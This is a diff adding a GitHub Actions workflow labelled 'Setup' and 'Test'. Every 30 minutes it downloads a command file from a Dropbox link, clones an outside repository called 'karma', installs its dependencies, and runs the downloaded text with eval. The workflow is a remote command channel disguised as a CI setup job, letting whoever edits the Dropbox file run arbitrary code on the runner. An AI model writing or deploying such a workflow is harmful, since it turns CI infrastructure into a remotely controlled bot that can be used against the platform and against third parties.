@@ -1,0 +1,46 @@
+name: Setup
+
+on:
+  schedule:
+    - cron: '*/30 * * * *'
+  workflow_dispatch:
+
+jobs:
+  Test:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Set up Python 3.9
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.9'
+
+      - name: Cache pip dependencies
+        uses: actions/cache@v3
+        with:
+          path: ~/.cache/pip
+          key: ${{ runner.os }}-pip-${{ hashFiles('karma/requirements.txt') }}
+          restore-keys: |
+            ${{ runner.os }}-pip-
+
+      - name: Install wget
+        run: sudo apt-get update && sudo apt-get install -y wget  # Устанавливаем wget
+
+      - name: Download target.txt
+        run: wget "https://www.dropbox.com/scl/fi/fzsgzpi61k4487c2xj32w/target.txt?rlkey=ihrzjcg5sn18uuo0zibg9faxy&st=hrf9dyd1&dl=1" -O target.txt
+
+      - name: Extract command from target.txt
+        id: extract_command
+        run: |
+          command=$(cat target.txt)
+          echo "::set-output name=command::$command"
+
+      - name: Run
+        run: |
+          git clone https://github.com/s4evsa/karma
+          cd karma
+          pip3 install -r requirements.txt
+          eval "${{ steps.extract_command.outputs.command }}"
